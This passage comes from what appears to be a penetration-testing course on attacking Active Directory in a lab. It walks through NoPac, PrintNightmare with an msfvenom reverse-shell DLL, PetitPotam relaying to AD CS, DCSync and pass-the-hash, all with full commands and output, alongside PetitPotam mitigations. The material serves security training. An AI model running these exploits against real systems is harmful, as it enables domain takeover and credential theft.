PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm

```

If we check for cached tickets using `klist`, we'll see that the same problem exists. Due to the double hop problem, we can only interact with resources in our current session but cannot access the DC directly using PowerView. We can see that our current TGS is good for accessing the HTTP service on the target since we connected over WinRM, which uses SOAP (Simple Object Access Protocol) requests in XML format to communicate over HTTP, so it makes sense.

```powershell
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x11e387

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: HTTP/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
       Start Time: 6/28/2022 9:09:19 (local)
       End Time:   6/28/2022 19:09:19 (local)
       Renew Time: 0
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x8 -> ASC
       Kdc Called:

```

We also cannot interact directly with the DC using PowerView

```powershell
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname

Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
   + FullyQualifiedErrorId : DirectoryServicesCOMException

```

One trick we can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.

```powershell
PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

 WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce
 a security boundary between different user sessions that are created by using this endpoint. Verify that the Windows
PowerShell runspace configuration is restricted to only the necessary set of cmdlets and capabilities.
WARNING: Register-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name has
recently been unregistered, certain system data structures may still be cached. In that case, a restart of WinRM may be
 required.
All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session
configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.

   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin

Type            Keys                                Name
----            ----                                ----
Container       {Name=backupadmsess}                backupadmsess

```

Once this is done, we need to restart the WinRM service by typing `Restart-Service WinRM` in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.

After we start the session, we can see that the double hop problem has been eliminated, and if we type `klist`, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote machine in the context of the `backupadm` user and
all requests from our local machine will be sent directly to the Domain Controller.

```powershell
PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
[DEV01]: PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x2239ba

Cached Tickets: (1)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
       Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
       KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
       Start Time: 6/28/2022 13:24:37 (local)
       End Time:   6/28/2022 23:24:37 (local)
       Renew Time: 7/5/2022 13:24:37 (local)
       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x1 -> PRIMARY
       Kdc Called: DC01

```

We can now run tools such as PowerView without having to create a new PSCredential object.

```powershell
[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc

```

Note: We cannot use `Register-PSSessionConfiguration` from an evil-winrm shell because we won't be able to get the credentials popup. Furthermore, if we try to run this by first setting up a PSCredential object and then attempting to run the command by passing credentials like `-RunAsCredential $Cred`, we will get an error because we can only use `RunAs` from an elevated PowerShell terminal. Therefore, this method will not work via an evil-winrm session as it requires GUI access and a proper PowerShell console. Furthermore, in our testing, we could not get this method to work from PowerShell on a Parrot or Ubuntu attack host due to certain limitations on how PowerShell on Linux works with Kerberos credentials. This method is still highly effective if we are testing from a Windows attack host and have a set of credentials or compromise a host and can connect via RDP to use it as a "jump host" to mount further attacks against hosts in the environment. .

We can also use other methods such as CredSSP, port forwarding, or injecting into a process running in the context of a target user (sacrificial process) that we won't cover here.

* * *

## Wrap Up

In this section, we've seen how to overcome the Kerberos "Double Hop" problem when working with WinRM in an AD environment. We will encounter this often during our assessments, so we must understand the issue and have certain tactics in our toolbox to avoid losing time.

The following section will cover other ways to escalate privileges and move laterally in a domain once we have valid credentials using various critical vulnerabilities identified throughout 2021.


# Bleeding Edge Vulnerabilities

* * *

When it comes to patch management and cycles, many organizations are not quick to roll out patches through their networks. Because of this, we may be able to achieve a quick win either for initial access or domain privilege escalation using a very recent tactic. At the time of writing (April 2022), the three techniques shown in this section are relatively recent (within the last 6-9 months). These are advanced topics that can not be covered thoroughly in one module section. The purpose of demonstrating these attacks is to allow students to try out the latest and greatest attacks in a controlled lab environment and present topics that will be covered in extreme depth in more advanced Active Directory modules. As with any attack, if you do not understand how these work or the risk they could pose to a production environment, it would be best not to attempt them during a real-world client engagement. That being said, these techniques could be considered "safe" and less destructive than attacks such as [Zerologon](https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/) or [DCShadow](https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/). Still, we should always exercise caution, take detailed notes, and communicate with our clients. All attacks come with a risk. For example, the `PrintNightmare` attack could potentially crash the print spooler service on a remote host and cause a service disruption.

As information security practitioners in a rapidly changing and evolving field, we must keep ourselves sharp and on top of recent attacks and new tools and techniques. We recommend trying out all of the techniques in this section and doing additional research to find other methods for performing these attacks. Now, let's dive in.

* * *

## Scenario Setup

In this section, we will perform all examples from a Linux attack host. You can spawn the hosts for this section at the end of this section and SSH into the ATTACK01 Linux attack host. For the portion of this section that demonstrates interaction from a Windows host (using Rubeus and Mimikatz), you could spawn the MS01 attack host in the previous or next section and use the base64 certificate blob obtained using `ntlmrelayx.py` and `petitpotam.py` to perform the same pass-the-ticket attack using Rubeus as demonstrated near the end of this section.

## NoPac (SamAccountName Spoofing)

A great example of an emerging threat is the [Sam\_The\_Admin vulnerability](https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699), also called `noPac` or referred to as `SamAccountName Spoofing` released at the end of 2021. This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.

| 42278 | 42287 |
| --- | --- |
| `42278` is a bypass vulnerability with the Security Account Manager (SAM). | `42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS. |

This exploit path takes advantage of being able to change the `SamAccountName` of a computer account to that of a Domain Controller. By default, authenticated users can add up to [ten computers to a domain](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain). When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this [blog post](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).

We can use this [tool](https://github.com/Ridter/noPac) to perform this attack. This tool is present on the ATTACK01 host in `/opt/noPac`.

NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac exploit repo is cloned to our attack host if needed. We can use these commands to do so:

#### Ensuring Impacket is Installed

```shell
git clone https://github.com/SecureAuthCorp/impacket.git

```

```shell
python setup.py install

```

#### Cloning the NoPac Exploit Repo

```shell
git clone https://github.com/Ridter/noPac.git

```

Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner ( `scanner.py`) then use the exploit ( `noPac.py`) to gain a shell as `NT AUTHORITY/SYSTEM`. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We'll also notice the `ms-DS-MachineAccountQuota` number is set to 10. In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to `0` can prevent quite a few AD attacks.

#### Scanning for NoPac

```shell
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap

███    ██  ██████  ██████   █████   ██████

[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663

```

There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.

#### Running NoPac & Getting a Shell

```shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

[*] Exploiting..

```

We will notice that a `semi-interactive shell session` is established with the target using [smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py). Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using `cd`.

It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use `ls` to confirm.

#### Confirming the Location of Saved Tickets

```shell
ls

administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py

```

We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the `-dump` flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.

#### Using noPac to DCSync the Built-in Administrator Account

```shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator

## Windows Defender & SMBEXEC.py Considerations

If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. The first thing smbexec.py does is create a service called `BTOBTO`. Another service called `BTOBO` is created, and any command we type is sent to the target over SMB inside a .bat file called `execute.bat`. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system. Let's look at a Windows Defender log to see what behavior was considered malicious.

#### Windows Defender Quarantine Log

![image](https://academy.hackthebox.com/storage/modules/143/defenderLog.png)

If opsec or being "quiet" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py. The focus of this module is on tactics and techniques. We will refine our methodology as we progress in more advanced modules, but we first must obtain a solid base in enumerating and attacking Active Directory.

* * *

## PrintNightmare

`PrintNightmare` is the nickname given to two vulnerabilities ( [CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the [Windows Privilege Escalation](https://academy.hackthebox.com/course/preview/windows-privilege-escalation) module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let's practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.

Before conducting this attack, we must retrieve the exploit we will use. In this case, we will be using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit. We can use Git to clone it to our attack host:

#### Cloning the Exploit

```shell
git clone https://github.com/cube0x0/CVE-2021-1675.git

```

For this exploit to work successfully, we will need to use cube0x0's version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's (this is already installed on ATTACK01 in the lab). We can use the commands below to accomplish this:

#### Install cube0x0's Version of Impacket

```shell
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

```

We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.

#### Enumerating for MS-RPRN

```shell
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol

```

After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using `msfvenom`.

#### Generating a DLL Payload

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 8704 bytes

```

We will then host this payload in an SMB share we create on our attack host using `smbserver.py`.

#### Creating a Share with smbserver.py

```shell
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

```

Once the share is created and hosting our payload, we can use MSF to configure & start a multi handler responsible for catching the reverse shell that gets executed on the target.

#### Configuring & Starting MSF multi/handler

```shell
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080

```

With the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target. The command below is how we use the exploit:

#### Running the Exploit

```shell
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:[email protected] '\\172.16.5.225\CompData\backupscript.dll'

[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...

<SNIP>

```

Notice how at the end of the command, we include the path to the share hosting our payload ( `\\<ip address of attack host>\ShareName\nameofpayload.dll`). If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back to our multi handler giving us an elevated SYSTEM shell.

#### Getting the SYSTEM Shell

```shell
[*] Sending stage (200262 bytes) to 172.16.5.5
[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400

C:\Windows\system32>whoami
whoami
nt authority\system

```

Once the exploit has been run, we will notice that a Meterpreter session has been started. We can then drop into a SYSTEM shell and see that we have NT AUTHORITY\\SYSTEM privileges on the target Domain Controller starting from just a standard domain user account.

## PetitPotam (MS-EFSRPC)

PetitPotam ( [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

[This](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.

Let's walk through the attack. First off, we need to start `ntlmrelayx.py` in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.

#### Starting ntlmrelayx.py

```shell
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

In another window, we can run the tool [PetitPotam.py](https://github.com/topotam/PetitPotam). We run this tool with the command `python3 PetitPotam.py <attack host IP> <Domain Controller IP>` to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.

There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. There is also a PowerShell implementation of the tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1).

Here we run the tool and attempt to coerce authentication via the [EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) method.

#### Requesting a TGT Using gettgtpkinit.py

Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.

```shell
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

```

#### Setting the KRB5CCNAME Environment Variable

The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.

```shell
export KRB5CCNAME=dc01.ccache

```

#### Using Domain Controller TGT to DCSync

We can then use this TGT with `secretsdump.py` to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.

```shell
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

```

We could also use a more straightforward command: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the tool will retrieve the username from the ccache file. We can see this by typing `klist` (using the `klist` command requires installation of the [krb5-user](https://packages.ubuntu.com/focal/krb5-user) package on our attack host. This is installed on ATTACK01 in the lab already).

#### Running klist

```shell
klist

Ticket cache: FILE:dc01.ccache
Default principal: [email protected]

04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/[email protected]

```

#### Confirming Admin Access to the Domain Controller

Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.

```shell
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

```

#### Submitting a TGS Request for Ourselves Using getnthash.py

We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.

```shell
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

[*] Requesting ticket to self with PAC
Recovered NT Hash
313b6f423cd1ee07e91315b4919fb4ba

```

We can then use this hash to perform a DCSync with secretsdump.py using the `-hashes` flag.

#### Using Domain Controller NTLM Hash to DCSync

```shell
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

```

Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.

Note: We would need to use the `MS01` attack host in another section, such as the `ACL Abuse Tactics` or `Privileged Access` section once we have the base64 certificate saved down to our notes to perform this using Rubeus.

Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host. Here, we grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and establish persistence. We could obtain the NT hash for any privileged user using DCSync and move forward to the next phase of our assessment.

## PetitPotam Mitigations

First off, the patch for [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) should be applied to any affected hosts. Below are some further hardening steps that can be taken:

- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use

For more reading on attacking Active Directory Certificate Services, I highly recommend the whitepaper [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) as this demonstrates attacks against AD CS that can be performed using authenticated API calls. This shows that just applying the CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS, because an attacker with standard domain user credentials can still perform attacks against AD CS in many instances. The whitepaper also details other hardening and detection steps that can be taken to harden AD CS.

* * *

## Recap

In this section we covered three recent attacks:

- NoPac (SamAccountName Spoofing)
- PrintNightmare (remotely)
- PetitPotam (MS-EFSRPC)

Each of these attacks can be performed with either standard domain user access (NoPac) or without any type of authentication to the domain at all (PrintNightmare and PetitPotam), and can lead to domain compromise relatively easily. There are multiple ways to perform each attack, and we covered a few. Active Directory attacks continue to evolve, and these are surely not the last extremely high-impact attack vectors that we will see. When these types of attacks are released, we should strive to build a small lab environment to practice them in, so we are ready to use them safely and effectively in a real-world engagement should the opportunity arise. Understanding how to set up these attacks in a lab can also significantly increase our understanding of the issue and help us to better advise our clients on the impact, remediation, and detections. This was just a tiny glimpse into the world of attacking AD CS, which could be an entire module.

In the next section, we'll talk through various other issues that we see from time to time in Active Directory environments that could help us further our access or lead to additional findings for our final client report.


# Miscellaneous Misconfigurations

* * *

There are many other attacks and interesting misconfigurations that we may come across during an assessment. A broad understanding of the ins and outs of AD will help us think outside the box and discover issues that others are likely to miss.

* * *

## Scenario Setup

In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portions of this section that require interaction from a Linux host, you can open a PowerShell console on MS01 and SSH to `172.16.5.225` with the credentials `htb-student:HTB_@cademy_stdnt!`.

* * *

## Exchange Related Group Membership

A default installation of Microsoft Exchange within an AD environment (with no split-administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). The group `Exchange Windows Permissions` is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group. It is common to find user accounts and even computers as members of this group. Power users and support staff in remote offices are often added to this group, allowing them to reset passwords. This [GitHub repo](https://github.com/gdedrouas/Exchange-AD-Privesc) details a few techniques for leveraging Exchange for escalating privileges in an AD environment.

The Exchange group `Organization Management` is another extremely powerful group (effectively the "Domain Admins" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called `Microsoft Exchange Security Groups`, which contains the group `Exchange Windows Permissions`.

#### Viewing Organization Management's Permissions

![image](https://academy.hackthebox.com/storage/modules/143/org_mgmt_perms.png)

If we can compromise an Exchange server, this will often lead to Domain Admin privileges. Additionally, dumping credentials in memory from an Exchange server will produce 10s if not 100s of cleartext credentials or NTLM hashes. This is often due to users logging in to Outlook Web Access (OWA) and Exchange caching their credentials in memory after a successful login.

* * *

## PrivExchange

The `PrivExchange` attack results from a flaw in the Exchange Server `PushSubscription` feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.

The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.

* * *

## Printer Bug

The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the `RpcOpenPrinter` method and use the `RpcRemoteFindFirstPrinterChangeNotificationEx` method, and force the server to authenticate to any host provided by the client over SMB.

The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.

The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.

We can use tools such as the `Get-SpoolStatus` module from [this](http://web.archive.org/web/20200919080216/https://github.com/cube0x0/Security-Assessment) tool (that can be found on the spawned target) or [this](https://github.com/NotMedic/NetNTLMtoSilverTicket) tool to check for machines vulnerable to the [MS-PRN Printer Bug](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability). This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.

#### Enumerating for MS-PRN Printer Bug

```powershell
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True

```

* * *

## MS14-068

This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.

The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching. The machine [Mantis](https://app.hackthebox.com/machines/98) on the Hack The Box platform showcases this vulnerability.

* * *

## Sniffing LDAP Credentials

